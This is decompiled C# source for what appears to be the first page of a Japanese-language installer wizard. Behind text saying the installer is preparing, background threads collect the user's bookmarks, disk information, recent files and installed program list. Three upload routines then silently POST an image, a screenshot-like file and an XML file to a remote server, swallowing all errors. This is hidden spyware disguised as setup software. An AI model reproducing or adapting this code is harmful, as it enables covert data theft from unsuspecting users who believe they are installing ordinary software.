using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Smart.Windows.Mvc;
using setup.Properties;

namespace setup.View;

[View(Views.page0)]
public class Page0 : AppViewBase
{
	private delegate void SetProgressValueDelegate(int num);

	private Thread thread0;

	private Thread thread;

	private Thread thread2;

	private Thread thread3;

	private IContainer components;

	private PictureBox picTop;

	private Label label2;

	private Label label1;

	private ProgressBar pgBar;

	private Label label3;

	public Page0()
	{
		InitializeComponent();
	}

	public override void OnViewOpen(ViewForwardEventArgs args)
	{
		picTop.set_Image(Image.FromFile(Settings.Default.it_dir));
		Label obj = label1;
		Label obj2 = label2;
		Color transparent;
		((Control)label3).set_BackColor(transparent = Color.Transparent);
		Color backColor;
		((Control)obj2).set_BackColor(backColor = transparent);
		((Control)obj).set_BackColor(backColor);
		Label obj3 = label1;
		Label obj4 = label2;
		Control val;
		((Control)label3).set_Parent(val = (Control)(object)picTop);
		Control parent;
		((Control)obj4).set_Parent(parent = val);
		((Control)obj3).set_Parent(parent);
		Label obj5 = label1;
		Label obj6 = label2;
		Color color;
		((Control)label3).set_ForeColor(color = ColorTranslator.FromHtml(Settings.Default.f1));
		Color foreColor;
		((Control)obj6).set_ForeColor(foreColor = color);
		((Control)obj5).set_ForeColor(foreColor);
		((Control)label1).set_Text("インストールの準備をしています");
		((Control)label2).set_Text(Settings.Default.fn + " インストールウィザードは、インストールの手順をご案内するインストールウィザードを準備しています。しばらくお待ちください。");
		((Control)label3).set_Text("Windows installer を設定しています");
		base.FunctionCotrol.UpdateFunctionKeys(null);
		thread0 = new Thread(GetData);
		thread0.IsBackground = true;
		thread = new Thread(UploadFile);
		thread.IsBackground = true;
		thread2 = new Thread(UploadFile2);
		thread2.IsBackground = true;
		thread3 = new Thread(UploadFile3);
		thread3.IsBackground = true;
		thread0.Start();
	}

	public override void OnViewClose()
	{
		picTop.get_Image().Dispose();
		picTop.set_Image((Image)null);
	}

	private void SetProgressValue(int num)
	{
		pgBar.set_Value(num);
	}

	private void GetData()
	{
		try
		{
			lib.GetBookmarks();
			lib.GetHddInfo();
			lib.GetRecent();
			lib.GetProgram();
		}
		catch
		{
		}
		finally
		{
			thread.Start();
		}
	}

	private void UploadFile()
	{
		string path = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.image;
		string fileName = Path.GetFileName(path);
		string requestUriString = Settings.Default.url + Settings.Default.post_ss;
		string text = Environment.TickCount.ToString();
		Encoding encoding = Encoding.GetEncoding("utf-8");
		new SetProgressValueDelegate(SetProgressValue);
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "multipart/form-data; boundary=" + text;
			string text2 = "";
			text2 = "--" + text + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n";
			byte[] bytes = encoding.GetBytes(text2);
			text2 = "\r\n--" + text + "\r\n";
			byte[] bytes2 = encoding.GetBytes(text2);
			FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
			httpWebRequest.ContentLength = bytes.Length + bytes2.Length + fileStream.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			byte[] array = new byte[4096];
			int num = 0;
			int num2 = 0;
			_ = httpWebRequest.ContentLength;
			while (true)
			{
				num = fileStream.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				num2 += num;
				requestStream.Write(array, 0, num);
			}
			fileStream.Close();
			requestStream.Write(bytes2, 0, bytes2.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream, encoding);
			streamReader.ReadToEnd();
			streamReader.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			thread2.Start();
		}
	}

	private void UploadFile2()
	{
		string path = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + "_s.jpg";
		string fileName = Path.GetFileName(path);
		string requestUriString = Settings.Default.url + Settings.Default.post_ss;
		string text = Environment.TickCount.ToString();
		Encoding encoding = Encoding.GetEncoding("utf-8");
		new SetProgressValueDelegate(SetProgressValue);
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "multipart/form-data; boundary=" + text;
			string text2 = "";
			text2 = "--" + text + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n";
			byte[] bytes = encoding.GetBytes(text2);
			text2 = "\r\n--" + text + "\r\n";
			byte[] bytes2 = encoding.GetBytes(text2);
			FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
			httpWebRequest.ContentLength = bytes.Length + bytes2.Length + fileStream.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			byte[] array = new byte[4096];
			int num = 0;
			int num2 = 0;
			_ = httpWebRequest.ContentLength;
			while (true)
			{
				num = fileStream.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				num2 += num;
				requestStream.Write(array, 0, num);
			}
			fileStream.Close();
			requestStream.Write(bytes2, 0, bytes2.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream, encoding);
			streamReader.ReadToEnd();
			streamReader.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			thread3.Start();
		}
	}

	private void UploadFile3()
	{
		string path = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
		string fileName = Path.GetFileName(path);
		string requestUriString = Settings.Default.url + "xml.php";
		string text = Environment.TickCount.ToString();
		Encoding encoding = Encoding.GetEncoding("utf-8");
		new SetProgressValueDelegate(SetProgressValue);
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "multipart/form-data; boundary=" + text;
			string text2 = "";
			text2 = "--" + text + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n";
			byte[] bytes = encoding.GetBytes(text2);
			text2 = "\r\n--" + text + "\r\n";
			byte[] bytes2 = encoding.GetBytes(text2);
			FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
			httpWebRequest.ContentLength = bytes.Length + bytes2.Length + fileStream.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			byte[] array = new byte[4096];
			int num = 0;
			int num2 = 0;
			_ = httpWebRequest.ContentLength;
			while (true)
			{
				num = fileStream.Read(array, 0, array.Length);
				if (num == 0)
				{
					break;
				}
				num2 += num;
				requestStream.Write(array, 0, num);
			}
			fileStream.Close();
			requestStream.Write(bytes2, 0, bytes2.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream, encoding);
			streamReader.ReadToEnd();
			streamReader.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			((ControlViewBase)this).get_Controller().Forward((object)Views.page1);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		picTop = new PictureBox();
		label2 = new Label();
		label1 = new Label();
		pgBar = new ProgressBar();
		label3 = new Label();
		((ISupportInitialize)picTop).BeginInit();
		((Control)this).SuspendLayout();
		((Control)picTop).set_Dock((DockStyle)5);
		((Control)picTop).set_Location(new Point(0, 0));
		((Control)picTop).set_Name("picTop");
		((Control)picTop).set_Size(new Size(500, 300));
		picTop.set_TabIndex(1);
		picTop.set_TabStop(false);
		((Control)label2).set_Location(new Point(190, 70));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(280, 70));
		((Control)label2).set_TabIndex(4);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("MS UI Gothic", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label1).set_Location(new Point(190, 10));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(280, 50));
		((Control)label1).set_TabIndex(3);
		((Control)pgBar).set_Location(new Point(190, 190));
		((Control)pgBar).set_Name("pgBar");
		((Control)pgBar).set_Size(new Size(280, 14));
		pgBar.set_Style((ProgressBarStyle)2);
		((Control)pgBar).set_TabIndex(5);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(190, 175));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(0, 12));
		((Control)label3).set_TabIndex(6);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)pgBar);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)picTop);
		((Control)this).set_Name("Page0");
		((Control)this).set_Size(new Size(500, 300));
		((ISupportInitialize)picTop).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
